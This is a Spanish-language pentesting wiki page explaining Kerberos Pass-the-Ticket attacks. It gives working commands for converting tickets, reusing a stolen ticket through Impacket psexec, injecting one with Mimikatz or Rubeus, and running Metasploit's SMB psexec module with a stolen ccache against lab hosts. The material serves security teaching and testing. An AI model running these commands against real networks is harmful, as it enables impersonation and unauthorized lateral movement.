# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Descripción general

En un ataque Pass-the-Ticket (PtT), un adversario usa un ticket Kerberos robado para autenticarse como el principal del ticket sin tener la contraseña de esa cuenta. Un ticket-granting ticket (TGT) se puede usar para solicitar tickets de servicio, mientras que un ticket de servicio robado está limitado al servicio al que va dirigido y a su período de validez.<sup>[[1]](#references)</sup>

Para conocer técnicas de obtención de tickets, consulta:

- [Recolección de tickets desde Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Recolección de tickets desde Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Conversión entre formatos de tickets de Linux y Windows

Las cachés de Kerberos suelen presentarse como archivos MIT `ccache` en Linux y archivos `.kirbi` en Windows. `ticket_converter` convierte estos formatos usando un ticket de entrada y una ruta de salida.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo también proporciona herramientas para tickets de Kerberos en Windows.<sup>[[3]](#references)</sup>

## Uso de un ticket

En Linux, configura `KRB5CCNAME` para que apunte a la caché e indica a un cliente de Impacket que use Kerberos sin solicitar una contraseña:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

En Windows, Mimikatz o Rubeus pueden importar un ticket `.kirbi` en la sesión de inicio de sesión actual. Usa `klist` para inspeccionar la caché resultante.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

La importación de tickets no otorga privilegios más allá de los que representan el ticket y la política de autorización del servicio de destino. Los tickets caducados, revocados, malformados o con un ámbito incorrecto pueden fallar.<sup>[[1]](#references)</sup>

Para obtener más contexto sobre ataques Kerberos y técnicas relacionadas para adquirir tickets, consulta la guía de ataques Kerberos de Tarlogic.<sup>[[7]](#references)</sup>

### Reutilizar un ticket externo en Metasploit

Metasploit no lee automáticamente el `KRB5CCNAME` de Impacket para sus módulos Kerberos. Proporciona al módulo un **archivo ccache** mediante su opción específica del protocolo `::Krb5Ccname`. Establece `::Rhostname` en el nombre de host SPN del destino y el dominio en el dominio de destino; `RHOST` puede seguir siendo la IP del destino. Así se puede usar un ticket ya adquirido sin introducir la contraseña de la cuenta.<sup>[[8]](#references)</sup>

Convierte primero un `.kirbi` a ccache si es necesario.<sup>[[9]](#references)</sup>

Por ejemplo, si tienes un ticket para una cuenta autorizada a crear servicios en el destino, ejecuta el [módulo SMB PsExec](../lateral-movement/psexec-and-winexec.md) usando esa caché:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit primero selecciona un service ticket coincidente de la caché proporcionada. Si solo encuentra un TGT, solicita un service ticket al KDC, por lo que esa ruta también requiere conectividad con el DC. Una caché que solo contiene service tickets no proporciona acceso a hosts no relacionados. Para otros módulos compatibles, cambia el prefijo de la opción (por ejemplo, `Winrm::Krb5Ccname` para [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - ejemplos de Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Técnicas de ataque a Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Autenticación de servicios](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Conversión de archivos kirbi y ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Implementación de Kerberos en el cliente SMB de Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
